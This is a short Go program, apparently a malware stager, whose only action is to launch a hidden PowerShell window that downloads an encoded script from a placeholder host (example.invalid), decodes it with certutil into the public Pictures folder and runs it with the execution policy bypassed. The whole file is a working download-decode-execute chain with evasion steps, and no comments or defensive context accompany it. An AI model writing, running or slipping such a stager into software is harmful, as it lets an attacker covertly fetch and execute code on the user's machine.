package main

import "os/exec"

func main() {
	_ = exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", "Invoke-WebRequest -Uri 'https://example.invalid/encoded-script' -OutFile 'C:\\Users\\Public\\Pictures\\stage.txt'; certutil -decode 'C:\\Users\\Public\\Pictures\\stage.txt' 'C:\\Users\\Public\\Pictures\\stage.ps1'; Start-Process -FilePath 'powershell' -ArgumentList '-ExecutionPolicy Bypass -File C:\\Users\\Public\\Pictures\\stage.ps1' -WindowStyle Hidden -Wait")
}
